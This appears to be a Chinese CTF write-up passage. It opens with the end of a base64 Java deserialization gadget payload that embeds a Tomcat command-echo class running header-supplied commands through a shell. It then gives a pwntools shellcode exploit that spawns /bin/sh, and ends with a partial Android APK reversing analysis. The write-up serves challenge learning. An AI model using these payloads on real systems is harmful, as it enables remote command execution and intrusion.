pc29yc3QAEExqYXZhL3V0aWwvTGlzdDtMAAppbnRlcmZhY2VzcQB+AAxMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAAB1cgAiW0xvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5BZHZpc29yO9+DDa3SHoR0AgAAeHAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeVTdZDfiTnH3AgAAeHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcQB+ABQAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4+roCAAFMAAZ0YXJnZXR0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAFonK/rq+AAAANAEiCgBOAJUJAE0AlgoAlwCYCgCXAJkIAJoKAE0AmwcAawoAlwCcCACdCgAeAJ4IAJ8IAKAHAKEIAKIIAJEIAKMHAKQIAKUHAKYLABMApwsAEwCoCACpCgAbAKoIAKsHAKwKABkArQcArgoArwCwCACxBwCyCACzCgAeALQIALUJACMAtgcAtwoAIwC4CAC5CAC6CAC7CgC8AL0KAB4AvggAvwgAwAgAwQgAwggAwwcAxAcAxQoAMADGCgAwAMcKAMgAyQoALwDKCADLCgAvAMwKAC8AzQoAHgDOCgBNAM8KALwA0AoA0QDSCADTCgAZANQKABkA1QgA1gcAfAoAGQDXCADYBwDZCADaCADbBwDcCgAZAN0HAN4KABkA3woASADgCgDhAOIKAOEA4wcA5AcA5QcA5gEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXABABJMamF2YS9sYW5nL09iamVjdDsBAARyZXNwAQABagEAAUkBAAJwcwEAEExqYXZhL3V0aWwvTGlzdDsBAAFvAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAAXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAFpAQAEdGhpcwEAI0xvcmcvZXhhbXBsZS9leHAvVG9tY2F0RWNob1BheWxvYWQ7AQAEZG9uZQEAAVoBAAJ0cwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAA1TdGFja01hcFRhYmxlBwDkBwDnBwCuBwCyBwCkBwCmBwBYAQAKRXhjZXB0aW9ucwEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAAJicwEAAltCBwDZBwDcBwCsAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsHAOgHAN4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDpAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAWVG9tY2F0RWNob1BheWxvYWQuamF2YQwAUABRDADqAF0HAOcMAOsA7AwA7QDuAQAHdGhyZWFkcwwAgACBDADvAPABAARleGVjDADxAPIBAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAGZ2xvYmFsAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwA8wD0DAD1APYBAANyZXEMAPcA+AEAC2dldFJlc3BvbnNlAQAPamF2YS9sYW5nL0NsYXNzDAD5APoBABBqYXZhL2xhbmcvT2JqZWN0BwD7DAD8AP0BAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAIVGVzdGVjaG8MAP4A/wEACXNldFN0YXR1cwwBAAB4AQARamF2YS9sYW5nL0ludGVnZXIMAFABAQEACWFkZEhlYWRlcgEAB1Rlc3RjbWQBAAdvcy5uYW1lBwECDAEDAQQMAQUA8AEABndpbmRvdwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABQAQYMAQcBCAcBCQwBCgELDABQAQwBAAJcQQwBDQEODAEPAPAMARABEQwAdQB2DAESARMHARQMARUA8AEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwBFgEXDAEYARkBAAhzZXRCeXRlcwwBGgD6AQAHZG9Xcml0ZQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcgEABHdyYXABAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAEbARwBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAR0A+AwAUAEeBwDoDAEfASAMAPUBIQEAIW9yZy9leGFtcGxlL2V4cC9Ub21jYXRFY2hvUGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEGphdmEvbGFuZy9UaHJlYWQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAD3RyYW5zbGV0VmVyc2lvbgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAEc2l6ZQEAAygpSQEAA2dldAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdpc0VtcHR5AQADKClaAQAEVFlQRQEABChJKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACGdldEJ5dGVzAQAEKClbQgEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsBABRqYXZhL3V0aWwvUHJvcGVydGllcwEACHRvU3RyaW5nAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADXNldEFjY2Vzc2libGU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sZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3EAfgAUAAAAAHcEAAAAAHhxAH4ANnhzcgAeY29tLmFsaWJhYmEuZmFzdGpzb24uSlNPTkFycmF5AAAAAAAAAAECAAFMAARsaXN0cQB+AAx4cHNxAH4AFAAAAAF3BAAAAAFxAH4ABXh4dXEAfgAGAAAALjAsAhQLFjHVSIZm3Jlgu++vUZ4F6nvPXgIULEylPJxnRx9bWzZaBXbbkQC/mJB0AANEU0FzcgAjamF2YXguc3dpbmcuZXZlbnQuRXZlbnRMaXN0ZW5lckxpc3SxNsZ9hOrWRAMAAHhwdAAXamF2YS5sYW5nLkludGVybmFsRXJyb3JzcgAcamF2YXguc3dpbmcudW5kby5VbmRvTWFuYWdlcuMrIXlMccpCAgACSQAOaW5kZXhPZk5leHRBZGRJAAVsaW1pdHhyAB1qYXZheC5zd2luZy51bmRvLkNvbXBvdW5kRWRpdKWeULpT25X9AgACWgAKaW5Qcm9ncmVzc0wABWVkaXRzdAASTGphdmEvdXRpbC9WZWN0b3I7eHIAJWphdmF4LnN3aW5nLnVuZG8uQWJzdHJhY3RVbmRvYWJsZUVkaXQIDRuO7QILEAIAAloABWFsaXZlWgALaGFzQmVlbkRvbmV4cAEBAXNyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAABkc3IAHmNvbS5hbGliYWJhLmZhc3Rqc29uLkpTT05BcnJheQAAAAAAAAABAgABTAAEbGlzdHQAEExqYXZhL3V0aWwvTGlzdDt4cHNxAH4AAAAAAAF3BAAAAAFxAH4ABXhwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHB4AAAAAAAAAGRweHg=)}}
```

![1](QQ20250209-000009.jpg)

我是真没想到居然那么多人都会做这个题，秀

## **签个到吧**

```
baozongwi@ubuntu:~/Desktop$ checksec pwn
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/home/baozongwi/Desktop/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

![1](QQ20250209-130637.jpg)

`mmap`在`0x114514000`分配了`0x1000`字节的内存,权限为7，`mprotect`再次确认该内存的权限为7，所以这个区域可执行代码，把`shell`搞到这里来即可，先填充22个字节，执行`read`扩大空间，将栈指针`rsp` 指向`buf`末尾`+0x1000`，确保后续 push 操作不会覆盖Shellcode。

```python
from pwn import *

context(log_level='debug', arch='amd64', os='Linux')
io = process("./pwn")

# read(0, buf, 0x80)
shellcode1 = asm('''
    mov rsi, rdi
    mov edi, eax
    mov dl, 0x80
    syscall
    ''')

# execve("/bin/sh", 0, 0)
shellcode2 = asm('''
    mov rsp, rsi
    add rsp, 0x1000
    xor rsi, rsi
    mul rsi
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    mov al, 59
    syscall
    ''')

print(len(shellcode1))
io.send(shellcode1)
payload = b'a' * 9 + shellcode2
io.send(payload)
io.interactive()
```

## **Hook Fish**

下载之后是apk文件，直接放到`jadx`里面，找到关键代码

```java
package com.example.hihitt;

import android.app.DownloadManager.Request;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View.OnClickListener;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class MainActivity extends AppCompatActivity {
    private BroadcastReceiver downloadCompleteReceiver;
    private long downloadID;
    private DownloadManager downloadManager;
    private File downloadedFile;
    String encodeText;

    public MainActivity() {
        this.downloadCompleteReceiver = new BroadcastReceiver() {
            @Override  // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                long downloadedID = intent.getLongExtra("extra_download_id", -1L);
                if(MainActivity.this.downloadID == downloadedID) {
                    MainActivity.this.loadClass(MainActivity.this.encodeText);
                    MainActivity.this.fish_fade();
                }
            }
        };
    }

    private static void code(char[] arg3, int arg4) {
        if(arg4 >= arg3.length - 1) {
            return;
        }

        arg3[arg4] = (char)(arg3[arg4] ^ arg3[arg4 + 1]);
        arg3[arg4 + 1] = (char)(arg3[arg4] ^ arg3[arg4 + 1]);
        arg3[arg4] = (char)(arg3[arg4] ^ arg3[arg4 + 1]);
        MainActivity.code(arg3, arg4 + 2);
    }

    public String decode(String boy) {
        try {
            Class loadedClass = new DexClassLoader(new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "hook_fish.dex").getAbsolutePath(), this.getCacheDir().getAbsolutePath(), null, this.getClassLoader()).loadClass("fish.hook_fish");
            Object obj = loadedClass.newInstance();
            return (String)loadedClass.getMethod("decode", String.class).invoke(obj, boy);
        }
        catch(Exception e) {
            e.printStackTrace();
            return "Error";
        }
    }

    public String encode(String girl) {
        try {
            Class loadedClass = new DexClassLoader(new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "hook_fish.dex").getAbsolutePath(), this.getCacheDir().getAbsolutePath(), null, this.getClassLoader()).loadClass("fish.hook_fish");
            Object obj = loadedClass.newInstance();
            return (String)loadedClass.getMethod("encode", String.class).invoke(obj, girl);
        }
        catch(Exception e) {
            e.printStackTrace();
            return "Error";
        }
    }

    public static String encrypt(String arg8) {
        byte[] str1 = arg8.getBytes();
        int i;
        for(i = 0; i < str1.length; ++i) {
            str1[i] = (byte)(str1[i] + 68);
        }

        StringBuilder hexStringBuilder = new StringBuilder();
        int v4;
        for(v4 = 0; v4 < str1.length; ++v4) {
            hexStringBuilder.append(String.format("%02x", ((byte)str1[v4])));
        }

        char[] str3 = hexStringBuilder.toString().toCharArray();
        MainActivity.code(str3, 0);
        int i;
        for(i = 0; i < str3.length; ++i) {
            str3[i] = str3[i] >= 97 && str3[i] <= 102 ? ((char)(str3[i] - 49 + i % 4)) : ((char)(str3[i] + 55 + i % 10));
        }

        Log.d("encrypt: ", new String(str3));
        return new String(str3);
    }

    private void fish(String arg8) {
        File file = new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "hook_fish.dex");
        DownloadManager downloadManager = (DownloadManager)this.getSystemService("download");
        DownloadManager.Request request = new DownloadManager.Request(Uri.parse(arg8));
        request.setTitle("钓鱼");
        request.setDestinationUri(Uri.fromFile(file));
        request.setAllowedOverRoaming(false);
        request.setAllowedOverMetered(false);
        this.downloadID = downloadManager.enqueue(request);
        Toast.makeText(this, "Fishing......", 0).show();
    }

    private void fish_fade() {
        new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "hook_fish.dex").delete();
    }

    public void loadClass(String input0) {
        String input1 = this.encode(input0);
        DexClassLoader dLoader = new DexClassLoader(Uri.fromFile(new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "hook_fish.dex")).toString(), null, null, ClassLoader.getSystemClassLoader().getParent());
        try {
            Class loadedClass = dLoader.loadClass("fish.hook_fish");
            Object obj = loadedClass.newInstance();
            if(((Boolean)loadedClass.getMethod("check", new Class[]{String.class}).invoke(obj, new Object[]{input1})).booleanValue()) {
                Toast.makeText(this, "恭喜，鱼上钩了！", 0).show();
                return;
            }
        }
        catch(Exception e) {
            e.printStackTrace();
            return;
        }
    }

    @Override  // androidx.fragment.app.FragmentActivity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.setContentView(layout.activity_main);
        EditText editText = (EditText)this.findViewById(id.editTextText);
        String hookfish = this.getString(string.pool);
        this.downloadManager = (DownloadManager)this.getSystemService("download");
        ((Button)this.findViewById(id.download_button)).setOnClickListener(new View.OnClickListener() {
            @Override  // android.view.View$OnClickListener
            public void onClick(View view) {
                String inputText = editText.getText().toString();
                if(!inputText.isEmpty()) {
                    MainActivity.this.encodeText = MainActivity.encrypt(inputText);
                    MainActivity.this.fish(hookfish);
                    List fishTypes = Arrays.asList(new String[]{"鲈鱼", "鳕鱼", "甲鱼", "咸鱼", "金鱼", "鲮鱼", "鲅鱼", "鲫鱼", "山椒鱼", "鮰鱼"});
                    String v6 = "收获一条" + ((String)fishTypes.get(new Random().nextInt(fishTypes.size()))) + ",但是鱼逃走了";
                    Toast.makeText(MainActivity.this, v6, 0).show();
                    return;
                }

                Toast.makeText(MainActivity.this, "请先输入口令，并在联网条件下再钓鱼", 0).show();
            }
        });
        this.registerReceiver(this.downloadCompleteReceiver, new IntentFilter("android.intent.action.DOWNLOAD_COMPLETE"));
    }

    @Override  // androidx.appcompat.app.AppCompatActivity
    protected void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(this.downloadCompleteReceiver);
    }
}
```

主要看加密算法，其他的纯扯淡

```java
public static String encrypt(String str) {
    byte[] str1 = str.getBytes();
    for (int i = 0; i < str1.length; i++) {
        str1[i] = (byte) (str1[i] + 68);
    }
    StringBuilder hexStringBuilder = new StringBuilder();
    for (byte b : str1) {
        hexStringBuilder.append(String.format("%02x", Byte.valueOf(b)));
    }
    String str2 = hexStringBuilder.toString();
    char[] str3 = str2.toCharArray();
    code(str3, 0);
    for (int i2 = 0; i2 < str3.length; i2++) {
        if (str3[i2] >= 'a' && str3[i2] <= 'f') {
            str3[i2] = (char) ((str3[i2] - '1') + (i2 % 4));
        } else {
            str3[i2] = (char) (str3[i2] + '7' + (i2 % 10));
        }
    }
    return new String(str3);
}
```

**步骤 1**：首先，将输入字符串转为字节数组，并且每个字节加上 68。

**步骤 2**：将字节数组转换成十六进制字符串。

**步骤 3**：通过 `code()` 方法对十六进制字符数组进行加密，依次对每对字符进行异或操作。

**步骤 4**：修改字符数组中的字符。如果字符是 `a-f` 范围内的，会根据索引进行计算；否则根据其他规则进行修改。

并且发现其中反复提到`fish.hook_fish`里面应该也是加密算法，而且还会产生dex文件，这个东西得想办法搞到，问GPT知道可以把`apk`后缀改成`zip`进行解压，解压之后发现有四个dex文件，挨着看，看完之后发现好像解压没屌用，发现咩找到那个文件，直接放在010里面搜一下

![1](QQ20250209-220553.jpg)

反编译得到源码

```java
package fish;

import java.util.HashMap;

/* loaded from: D:\LearnigForCyberSecurity\CTF\CTF-Writeups\VNCTF\hook_fish\hook_fish.dex */
public class hook_fish {
    private HashMap<String, Character> fish_dcode;
    private HashMap<Character, String> fish_ecode;
    private String strr = "jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji";

    public hook_fish() {
        encode_map();
        decode_map();
    }

    public void encode_map() {
        HashMap<Character, String> hashMap = new HashMap<>();
        this.fish_ecode = hashMap;
